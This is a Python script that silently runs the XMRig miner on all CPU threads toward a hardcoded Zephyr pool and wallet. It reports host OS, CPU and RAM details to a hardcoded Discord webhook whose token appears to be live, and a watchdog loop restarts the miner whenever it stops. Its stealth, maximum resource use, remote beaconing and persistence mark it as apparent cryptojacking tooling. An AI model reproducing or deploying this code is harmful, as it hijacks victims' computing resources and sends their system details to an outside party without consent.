import os
import subprocess
import time
import requests

# Configuration (Webhook and Pool Information)
WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Replace with actual webhook
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker"  # Replace with your Monero wallet
POOL = "fr.zephyr.herominers.com:1123"  # Replace with your mining pool

# Paths for xmrig
XM_DIR = "/path/to/your/repository/foreverminer/xmrig"  # Update this to the correct path where you uploaded xmrig
XM_BIN = os.path.join(XM_DIR, "xmrig")

# Ensure the directory for xmrig exists (it's where the binary is)
os.makedirs(XM_DIR, exist_ok=True)

def start_miner(threads):
    """Start mining process with maximum threads."""
    cmd = [XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(threads)]
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        notify(f"❌ Miner failed to start:\n```{e}```")
        return False

def notify(message):
    """Send a notification to Discord via webhook."""
    try:
        requests.post(WEBHOOK, json={"content": message})
    except Exception as e:
        print(f"Failed to send notification: {e}")

def system_info():
    """Get system information to optimize mining setup."""
    try:
        import platform
        system = platform.system()
        if system == "Windows":
            cpu = subprocess.getoutput("wmic cpu get caption")
            ram = subprocess.getoutput("systeminfo | findstr /C:'Total Physical Memory'")
        else:
            cpu = subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip()
            ram = subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip()
        return {"OS": system, "CPU": cpu, "RAM": ram, "Threads": str(os.cpu_count())}
    except Exception as e:
        return {"error": str(e)}

def is_miner_running():
    """Check if the miner is running by inspecting active processes."""
    try:
        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
        return "xmrig" in output
    except Exception as e:
        return False

def main():
    # Check if xmrig exists at the given path
    if not os.path.exists(XM_BIN):
        notify(f"❌ XMRig binary not found at {XM_BIN}")
        return

    # Get system information and determine available threads
    sysinfo = system_info()
    info_str = "\n".join([f"{k}: {v}" for k, v in sysinfo.items()])
    notify(f"✅ Shapeshifter Miner Initialized\n```{info_str}```")

    # Start miner with maximum threads (all available cores)
    threads = os.cpu_count()  # Use all threads available
    if start_miner(threads):
        notify(f"✅ Miner started using {threads} threads.")
    else:
        notify("❌ Miner failed to start.")

    # Watchdog loop to keep the miner running
    while True:
        time.sleep(60)  # Just a simple delay to keep the script running
        if not is_miner_running():
            notify("🔁 Miner not found. Restarting...")
            start_miner(threads)

if __name__ == "__main__":
    main()
